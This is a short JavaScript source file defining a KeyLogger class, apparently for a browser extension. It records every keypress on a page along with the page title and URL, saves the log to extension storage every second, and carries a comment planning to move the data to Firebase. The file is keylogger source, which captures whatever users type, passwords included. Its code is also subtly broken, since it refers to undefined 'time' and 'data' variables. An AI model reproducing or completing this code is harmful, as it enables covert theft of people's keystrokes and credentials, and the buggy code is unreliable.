'use strict'


class KeyLogger {
	constructor() {
		this.active = false;

		this.time = new Date().getTime();
		this.data = {};
		this.shouldSave = false;
		this.lastLog = this.time;

		this.data[this.time] = document.title + "^~^" + document.URL + "^~^";

		this.save = this.save.bind(this);
		this.onKeypress = this.onKeypress.bind(this);
	}

	init(){
		if (!document.title)  document.title = document.URL;
		document.addEventListener('keypress', this.onKeypress)
		window.onbeforeunload = this.save;

		setInterval(()=>{this.save()}, 1000)
	}

	log(input) {
    var now = new Date().getTime();
    if (now - this.lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
    this.data[time] += input;
    this.shouldSave = true;
    this.lastLog = now;
    console.log("Logged", input);
	}

	save() {
    if (this.shouldSave) {
    		// testing with local storage for now, later we should use firebase to store this data
	      chrome.storage.local.set(data, () => { console.log("Saved", data); this.shouldSave = false; });
	  }
	}

	onKeypress(e) {
		e = e || window.event;
		var charCode = typeof e.which == "number" ? e.which : e.keyCode;
		if( charCode ) {
			this.log(String.fromCharCode(charCode));
		}
	}
}

module.exports = KeyLogger;